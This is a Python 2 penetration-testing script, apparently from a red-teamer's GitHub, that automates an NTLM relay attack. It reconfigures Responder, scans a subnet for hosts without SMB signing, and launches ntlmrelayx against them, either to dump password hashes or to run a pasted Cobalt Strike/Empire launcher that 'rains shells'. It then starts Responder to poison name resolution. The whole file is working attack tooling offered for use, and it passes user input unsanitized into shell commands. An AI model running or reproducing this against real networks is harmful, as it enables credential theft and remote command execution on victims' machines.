#! /usr/bin/python
# Written By Richard Davy
# @rd_pentest
# https://github.com/rmdavy
# Released under Apache V2 see LICENCE for more information
# 

import os, signal, sys, re, binascii, subprocess, string, readline, argparse

try:
	from termcolor import colored 
except ImportError:
	print ('termcolor appears to be missing - try: pip install termcolor')
	exit(1)

#Routine handles Crtl+C
def signal_handler(signal, frame):
	print colored("\nCtrl+C pressed.. aborting...",'red')
	sys.exit()

def main():

	#Display and generate banner
	os.system('clear')
	print '\n\n'

	print colored('    _   __________    __  ___      ____       __           _  __    _       __                ','yellow')
	print colored('   / | / /_  __/ /   /  |/  /     / __ \___  / /___ ___  _| |/ /   | |     / /________ _____  ','yellow')
	print colored('  /  |/ / / / / /   / /|_/ /_____/ /_/ / _ \/ / __ `/ / / /   /____| | /| / / ___/ __ `/ __ \ ','yellow')
	print colored(' / /|  / / / / /___/ /  / /_____/ _, _/  __/ / /_/ / /_/ /   /_____/ |/ |/ / /  / /_/ / /_/ / ','yellow')
	print colored('/_/ |_/ /_/ /_____/_/  /_/     /_/ |_|\___/_/\__,_/\__, /_/|_|     |__/|__/_/   \__,_/ .___/  ','yellow')
	print colored('                                                  /____/                            /_/       ','yellow')

	print '\n'
	print colored('	                                                                                  Version 1.0 ','yellow')
	print colored('	                                                                  	       By @rd_pentest','blue') 
	print '\n\n'

	parser = argparse.ArgumentParser()
	parser.add_argument('-r',dest='reset',help='Turns back on SMB and HTTP arguments in /usr/share/responder/Responder.conf',default="n", required=False)
	args = parser.parse_args()

	if args.reset.upper() == "RESET":
		if 'SMB = Off' in open('/usr/share/responder/Responder.conf').read():
			print colored('[-]Updating SMB = Off in /usr/share/responder/Responder.conf to SMB = On','yellow') 
		
			proc = subprocess.Popen("sed -i 's/SMB = Off/SMB = On/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)
			print proc.communicate()[0]	

		if 'HTTP = Off' in open('/usr/share/responder/Responder.conf').read():
			print colored('[-]Updating HTTP = Off in /usr/share/responder/Responder.conf to HTTP = On','yellow') 

			proc = subprocess.Popen("sed -i 's/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)
			print proc.communicate()[0]	

		print colored('[+]Reset Complete','green') 

		sys.exit()

	#Quick Check that Responder Config is OK
	if 'SMB = On' in open('/usr/share/responder/Responder.conf').read():
		print colored('[-]Updating SMB = On in /usr/share/responder/Responder.conf to SMB = Off, remember to change back when finished - python cs_ntlmrelayx-wrap.py -r reset','red') 
		
		proc = subprocess.Popen("sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)
		print proc.communicate()[0]	

	if 'HTTP = On' in open('/usr/share/responder/Responder.conf').read():
		print colored('[-]Updating HTTP = On in /usr/share/responder/Responder.conf to HTTP = Off, remember to change back when finished - python cs_ntlmrelayx-wrap.py -r reset','red') 

		proc = subprocess.Popen("sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)
		print proc.communicate()[0]	

	#Check file RunFinger exists and if so execute it
	if os.path.isfile("/usr/share/responder/tools/RunFinger.py"):
		#Ask user for an IP or subnet to check against and store value in response
		response = raw_input("[*]Please enter a subnet or IP to check for SMB Signing:- ")
		#Check to see value of response it not empty
		if response !="":
			#Display message
			print colored('\n[+]Executing RunFinger.py to check for SMB Signing...\n','yellow') 
			#Execute RunFinger script passing the value held in response as our subnet or ip and generate a list of ips where smb 
			#signing is disabled
			proc = subprocess.Popen("/usr/share/responder/tools/RunFinger.py -g -i "+response+" > /tmp/smbfinger.txt", stdout=subprocess.PIPE,shell=True)
			print proc.communicate()[0]			
			#Remove from the file any items whereby Signing is True
			proc = subprocess.Popen("sed -i \"/Signing:'True'/d\" /tmp/smbfinger.txt", stdout=subprocess.PIPE,shell=True)
			print proc.communicate()[0]		
			#Get the IP addresses from smbfinger and put them into smbdisablelist
			proc = subprocess.Popen("cat /tmp/smbfinger.txt | cut -d \"'\" -f2 > /tmp/smbdisabledlist.txt", stdout=subprocess.PIPE,shell=True)
			print proc.communicate()[0]		
			#Count the number of IP addresses which we have to work with, if none bomb out
			num_lines = sum(1 for line in open('/tmp/smbdisabledlist.txt'))
			if num_lines>0:
				print colored('[+]Built a hosts list with '+str(num_lines)+' ips...','yellow')
			else:
				print colored('[!]No Hosts Found :-(','red')
				sys.exit()

			print colored('\n[*]Getting Available Interfaces...\n','green') 
			#execute the system command ifconfig to get a list of local interfaces
			os.system("ifconfig")
			#Ask the user for an IP to setup the listener with and store the value in ipresponse
			int_response = raw_input("[*]Please enter the interface you wish to use e.g. eth0:- ")
			#As user if they want it to rain shells - if Y as for launcher code		
			runcmd_response = raw_input("[?]Do you want to rain Cobalt/Empire Shells? Y/N):- ")
			if runcmd_response.upper()=="Y":	
				cmd_response = raw_input("[*]Please enter the Cobalt/Empire Launcher Code:- ")
				#Display messages 
				print colored('\n[+]Starting ntlmrelayx with Cobalt/Empire Launcher...','yellow') 
				#Execute ntlmrelayx in a new window
				os.system("gnome-terminal -- \"bash\" -c \"python /usr/local/bin/ntlmrelayx.py -smb2support -tf /tmp/smbdisabledlist.txt -c '"+cmd_response+"'\"")
			else:
				#Display messages 
				print colored('\n[+]Starting ntlmrelayx - Hashes should be dumped automatically on successfull connection','yellow')
				#Execute ntlmrelayx in a new window - this will when a session is created dump hashes from the machine
				os.system("gnome-terminal -- \"bash\" -c \"python /usr/local/bin/ntlmrelayx.py -smb2support -tf /tmp/smbdisabledlist.txt -l loot\"")

			#Start responder
			print colored('[+]Starting Responder on '+int_response+'...','yellow')
			os.system("gnome-terminal -- \"bash\" -c \"responder -I "+int_response+" -r -d -w\"")

			#Display reminder on resetting responder conf
			print colored('\n[+]Happy Hunting!! - Remember to Reset Responder.conf configuration','green')
			print colored('[+]python cs_ntlmrelayx-wrap.py -r reset\n','green')

if __name__ == '__main__':
	#Setup Signal handler in case of Ctrl+C
	signal.signal(signal.SIGINT, signal_handler)
	#Call main routine.
	main()
